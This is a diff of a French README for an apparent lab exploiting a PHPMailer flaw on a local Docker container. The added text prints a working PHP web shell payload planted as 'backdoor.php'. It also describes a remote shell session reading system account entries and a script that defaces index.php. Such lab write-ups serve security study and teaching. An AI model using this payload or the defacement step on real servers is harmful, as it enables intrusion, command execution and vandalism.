@@ -17,7 +17,7 @@ Lorsque l'image soit lancé sur le conteneur docker, visiter localhost:8080
 
 ![](index.png)
 
-Étape 2: Lancement du script "exploit.sh", ce dernier injecte un malicious code dans le serveur distant (dans notre cas ça sera "localhost:8080", puisque l'application est exécuté sur un container docker locale) sous la forme d'un fichier php que nous avons l'appelé "backdoor.php" en exploitant La faille de PHPMailer qui ne vérifier pas les données envoyées par l'utilisateur à travers le formulaire avant l'exécution, et par conséquent il va nous donner la main d'éxécuter les commandes à distance sur le script injecté (Remot shell).
+Étape 2: Lancement du script "exploit.sh", ce dernier injecte le malicious code (<?php echo "|".base64_encode(system(base64_decode($_GET["cmd"])))."|"; ?>) dans le serveur distant (dans notre cas ça sera "localhost:8080", puisque l'application est exécuté sur un container docker locale) sous la forme d'un fichier php que nous avons l'appelé "backdoor.php" en exploitant La faille de PHPMailer qui ne vérifier pas les données envoyées par l'utilisateur à travers le formulaire avant l'exécution, et par conséquent il va nous donner la possibilité d'éxécuter des commandes à distance à travers le script injecté (Remot shell).
 ```
 $ bash exploit.sh localhost:8080
 ```
@@ -42,8 +42,10 @@ smmsp:x:105:108:Mail
 RemoteShell> exit
 [+] Sortie
 ```
+En fait, ce script utilise implicitement le formulaire, et donc pour reproduire la meme chose manuellement avec le formulaire on remplissant les champs de formulaire par les données suivant:
 
-C'est intéressant, mais pour tester quelque chose de plus concrète, lancant le script "second_use_case.sh" qui exécute une commande sur le shell distant qui permet d'écraser le contenu du ficher "index.php" par une page noire contant le mot "defaced".
+
+Étape3: C'est intéressant, mais pour tester quelque chose de plus concrète, lancant le script "second_use_case.sh" qui exécute une commande sur le shell distant qui permet d'écraser le contenu du ficher "index.php" par une page noire contant le mot "defaced".
 ```
 $ bash concret_example.sh localhost:8080
 ```
